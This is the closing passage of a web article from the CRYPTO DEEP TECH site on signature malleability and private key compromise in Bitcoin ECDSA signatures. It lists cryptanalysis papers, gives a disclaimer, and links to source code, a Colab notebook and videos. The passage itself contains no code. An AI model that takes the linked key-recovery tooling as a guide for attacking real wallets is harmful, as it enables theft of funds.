<li><em><strong><a href="https://cryptodeeptech.ru/doc/39580001.pdf" target="_blank" rel="noreferrer noopener">Bleichenbacher, Daniel and May, Alexander. New Attacks on RSA with Small Secret CRT-Exponents</a></strong>&nbsp;// International Association for Cryptologic Research. — Darmstadt, Germany.</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/18.204_Xinyue_Deng_final_paper.pdf" target="_blank" rel="noreferrer noopener">Xinyue, Deng. An Introduction to LLL Algorithm</a></strong>&nbsp;// Massachusetts Institute of Technology.</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/An_Improved_Attack_on_the_Basic_MerkleHellman_Knapsack_Cryptosystem.pdf" target="_blank" rel="noreferrer noopener">Liu, Jiayang, Bi, Jingguo and Xu, Songyan. An Improved Attack on the Basic Merkle–Hellman Knapsack Cryptosystems</a></strong>&nbsp;// IEEE. — Beijing 100084, China.</em></li>



<li><em><strong><a href="https://github.com/fplll/fplll.git" target="_blank" rel="noreferrer noopener">Lattice algorithms using floating-point arithmetic</a>&nbsp;</strong>//</em>&nbsp;<em>The FPLLL development team. FPLLL, a lattice reduction library. — 2016</em>.</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://dzen.ru/video/watch/674116440bddfa35d730ca7a?share_to=link" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-57.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4993"></a></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>This material was created for the&nbsp;&nbsp;<a href="https://cryptodeeptool.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>&nbsp;portal &nbsp;to ensure financial data security and cryptography on elliptic curves&nbsp;&nbsp;<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">secp256k1</a>&nbsp;&nbsp;against weak&nbsp;&nbsp;<a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>&nbsp;signatures &nbsp;in the&nbsp;&nbsp;<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">BITCOIN</a>&nbsp;cryptocurrency . The creators of the software are not responsible for the use of materials.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p></p>



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/36SignatureMalleability" target="_blank" rel="noreferrer noopener">Source code</a></strong></p>



<p><strong><a href="https://colab.research.google.com/drive/1HMmeEQDL4kRKfJNQptTf3Mz4VTZmka8h?authuser=3&amp;hl=en" target="_blank" rel="noreferrer noopener">Google Colab</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/wf6QwCpP3oc" target="_blank" rel="noreferrer noopener">Video material: https://youtu.be/wf6QwCpP3oc</a></strong></p>



<p><strong><a href="https://dzen.ru/video/watch/674116440bddfa35d730ca7a" target="_blank" rel="noreferrer noopener">Video tutorial: https://dzen.ru/video/watch/674116440bddfa35d730ca7a</a></strong></p>



<p><strong><a href="https://cryptodeeptech.ru/signature-malleability" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/signature-malleability</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/057-1024x576.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4928"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">
	</div><!-- .entry-content -->
